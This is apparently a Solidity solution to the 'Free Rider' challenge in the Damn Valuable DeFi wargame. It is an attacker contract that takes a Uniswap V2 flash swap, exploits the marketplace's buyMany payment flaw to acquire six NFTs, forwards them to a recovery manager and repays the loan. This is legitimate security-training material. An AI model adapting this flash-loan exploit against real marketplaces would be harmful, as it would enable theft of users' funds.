// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {WETH} from "solmate/tokens/WETH.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}


contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
  DamnValuableNFT nftContract;
  address recoveryManager;
  FreeRiderNFTMarketplace marketContract;
  uint256[] tokenIds;
  IUniswapV2Pair uniswapPair;
  WETH weth;
  address player = msg.sender;

  constructor(DamnValuableNFT _nftContract, address _recoveryManager, FreeRiderNFTMarketplace _marketContract, uint256[] memory _tokenIds, IUniswapV2Pair _uniswapPair, WETH _weth) {
    nftContract = _nftContract;
    recoveryManager = _recoveryManager;
    marketContract = _marketContract;
    tokenIds = _tokenIds;
    uniswapPair = _uniswapPair;
    weth = _weth;
  }

  function attack() external {
    uniswapPair.swap(15 ether, 0, address(this), hex"00");
  }

  function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(15 ether);

        FreeRiderNFTMarketplace(marketContract).buyMany{ value: 15 ether }(tokenIds);
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nftContract.safeTransferFrom(address(this), recoveryManager, tokenId, abi.encode(player));
        }

        // Calculate fee and pay back loan.
        uint256 fee = ((15 ether * 3) / uint256(997)) + 1;
        weth.deposit{ value: 15 ether + fee }();
        weth.transfer(address(uniswapPair), 15 ether + fee);
    }


  function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}